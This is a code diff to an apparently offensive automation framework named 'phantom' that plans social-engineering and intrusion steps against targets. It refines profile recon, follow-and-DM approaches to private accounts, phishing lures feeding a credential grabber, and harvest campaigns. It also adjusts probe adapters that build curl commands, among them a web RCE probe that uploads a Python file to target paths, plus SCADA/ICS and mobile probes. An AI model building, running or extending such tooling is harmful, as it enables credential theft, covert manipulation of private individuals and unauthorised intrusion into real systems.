@@ -38,6 +38,22 @@ from phantom.automation.perception import (
 )
 
 
+def _join_local_shell(cmds: List[str]) -> str:
+    """Join LOCAL probe segments with a separator this host's shell runs.
+
+    The adapters below build chains that `execute_quiet` runs on the
+    OPERATOR's box (subprocess `shell=True`). On Windows that shell is
+    cmd.exe, which has no `;` separator: it hands everything after the
+    first command to that command as arguments. A `;`-joined probe chain
+    therefore collapsed into a single `echo` and produced zero markers —
+    MEASURED on this box (2026-10-17): the curl_probe chain returned 66
+    bytes and `head: unknown option -- s` instead of 10 probe sections,
+    while the same chain joined with `&` returned all 10. `&` is cmd.exe's
+    sequential separator, so it is the exact equivalent; POSIX keeps `;`.
+    """
+    return (" & " if os.name == "nt" else " ; ").join(cmds)
+
+
 def _has_service(kind_service: str, port: str):
     def _requires_service(wm: WorldModel) -> bool:
         return wm.has(kind_service, port) if port else bool(wm.find("service"))
@@ -413,6 +429,33 @@ def _has_finding(kind: str):
     return _requires_finding
 
 
+def _real_profiles(wm: WorldModel) -> list:
+    """Profile findings that stand for an EXISTING account.
+
+    A probe that came back `missing` is a fact about the PROBE ("we looked
+    here and found nothing"), and so is `unknown` ("the platform answered with
+    a page we cannot read"): neither is a profile. `find("profile")` cannot
+    tell them apart, so every profile gate was satisfied by an absence — auto
+    mode could plan a follow request at an account that does not exist. Live
+    evidence (2026-10-16): an email address probed as an instagram handle came
+    back `state=missing`, and seven variant handles came back `unknown` from
+    Instagram's universal app shell.
+    """
+    out = []
+    for f in wm.find("profile") or []:
+        v = f.value if isinstance(f.value, dict) else {}
+        if str(v.get("state", "") or "") in ("missing", "unknown"):
+            continue
+        out.append(f)
+    return out
+
+
+def _has_real_profile():
+    def _requires_profile(wm: WorldModel) -> bool:
+        return bool(_real_profiles(wm))
+    return _requires_profile
+
+
 def _has_sent_lure():
     """A lure was delivered: a phish (email/SMS) OR a DM. Both converge on
     the same grabber, so poll/harvest accept either channel."""
@@ -427,7 +470,7 @@ def _not_profile_known():
     handle known, DM path) go through harvest_campaign — the campaign poll
     that also catches opens/credentials and powers the cadence wait."""
     def _requires_no_profile(wm: WorldModel) -> bool:
-        return not bool(wm.find("profile"))
+        return not bool(_real_profiles(wm))
     return _requires_no_profile
 
 
@@ -437,7 +480,7 @@ def _harvest_flow():
     targets (username/phone). Plain email-only targets without a profile
     keep the quick single-shot grabber poll instead."""
     def _requires_social(wm: WorldModel) -> bool:
-        if wm.find("profile"):
+        if _real_profiles(wm):
             return True
         return getattr(wm, "target_type", "") in ("username", "phone")
     return _requires_social
@@ -445,7 +488,7 @@ def _harvest_flow():
 
 def _private_profile(wm: WorldModel) -> bool:
     """True when profile_recon proved the target account is private."""
-    for f in wm.find("profile") or []:
+    for f in _real_profiles(wm):
         if f.value.get("private"):
             return True
     return False
@@ -1041,6 +1084,12 @@ def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[F
                 confidence=0.7, source="profile_recon", target=wm.target))
         kv = _parse_marker_line(line, _SOCIAL_MARKERS["recon_state"])
         if kv.get("username") and kv.get("state"):
+            # `state=missing` is the outcome of a PROBE, not proof of an
+            # account — and `unknown` is a page we could not read at all.
+            # Keeping auto-mode's confidence curve for them (up to 0.90 for an
+            # agreed vote) made "we looked and it is not there" and "we could
+            # not read the page" indistinguishable from "the profile is here".
+            absent = kv.get("state") in ("missing", "unknown")
             findings.append(Finding(
                 kind="profile", key=f"profile:{kv['username']}",
                 value={"username": kv.get("username"),
@@ -1050,7 +1099,8 @@ def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[F
                        "state_confidence": kv.get("conf", "0"),
                        "followers": kv.get("followers", ""),
                        "full_name": kv.get("fullname", "").replace("_", " ")},
-                confidence=min(0.9, 0.5 + float(kv.get("conf", "0") or 0) * 0.4),
+                confidence=(0.2 if absent
+                            else min(0.9, 0.5 + float(kv.get("conf", "0") or 0) * 0.4)),
                 source="deep_recon", target=wm.target))
         kv = _parse_marker_line(line, _SOCIAL_MARKERS["commenter"])
         if kv.get("handle"):
@@ -1342,6 +1392,34 @@ def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[F
                        "platform": kv.get("platform", "")},
                 confidence=0.9, source="wait_follow", target=wm.target))
     return findings
+
+
+def store_social_markers(output: str, wm: WorldModel,
+                         slots: Optional[Dict[str, Any]] = None) -> List[Finding]:
+    """Interpret marker text and STORE it in `wm`; returns what was stored.
+
+    The public door for callers outside the auto loop. The markers are the
+    only durable output of a recon run: auto mode runs them through
+    `_social_interp` and stores the findings, but the manual
+    `social graph --run` printed four summary lines and dropped the rest — so
+    the offline `social graph` (no network) answered "empty" seconds after a
+    successful `--run`, and `--json`/`--graphml` exported an empty graph.
+
+    Storage mirrors the agent's rule (`_register_findings`): the finding keeps
+    its OWN source, and a value belief revision refuses is simply not
+    recorded. One mapping, one place.
+    """
+    stored: List[Finding] = []
+    for f in _social_interp(output or "", wm, slots or {}):
+        try:
+            kept = wm.add_finding(f.kind, f.key, f.value,
+                                  confidence=f.confidence,
+                                  source=f.source or "deep_recon",
+                                  evidence=getattr(f, "evidence", "") or "")
+        except Exception:
+            continue
+        stored.append(kept if kept is not None else f)
+    return stored
 
 
 def _email_candidates_adapter(wm, slots):
@@ -1685,7 +1763,7 @@ def _curl_probe_adapter(wm, slots):
         segments.append(
             f"curl -s -v --max-time 3 telnet://{host}:{port} 2>&1 "
             f"| head -12")
-    return " ; ".join(segments)
+    return _join_local_shell(segments)
 
 
 def _curl_probe_interp(output: str, wm: WorldModel,
@@ -2327,7 +2405,7 @@ def _web_rce_adapter(wm, slots):
         segments.append(
             f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
             f"{scheme}://{target}:{port}{p} | grep -o '{marker}:[0-9]*'")
-    probes = " ; ".join(segments)
+    probes = _join_local_shell(segments)
     tried = " ".join(f"{scheme}://{target}:{port}{p}" for p in paths[:6])
     return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
 
@@ -3054,7 +3132,7 @@ def _env_probe_adapter(wm, slots):
         cmds.append(f"echo __ENV_SCADA__ && echo 'scada/ics protocol: {names}'")
     if not cmds:
         cmds.append(f"echo __ENV_NONE__ && echo 'no management APIs detected'")
-    return " ; ".join(cmds)
+    return _join_local_shell(cmds)
 
 
 def _env_probe_interp(output, wm, slots):
@@ -3483,7 +3561,7 @@ def _mobile_probe_adapter(wm, slots):
         f"| grep -E ':200|:302|:301' "
         f"&& echo __MOBILE_WEB__")
     # common mobile port classes only probed if the scanner did not see them
-    return " ; ".join(cmds)
+    return _join_local_shell(cmds)
 
 
 def _mobile_probe_interp(output, wm, slots):
@@ -4361,7 +4439,7 @@ CAPABILITIES = [
         "target must accept before the DM can be delivered",
         [], ["follow_sent"], _dm_adapter, _social_interp,
         opsec_cost=1.0, detection_risk=0.2, stealth_level="passive", timeout=30,
-        preconditions=[_has_target_type("username"), _has_finding("profile")],
+        preconditions=[_has_target_type("username"), _has_real_profile()],
         banner="follow private account"),
 
     _mk("wait_follow", "social",
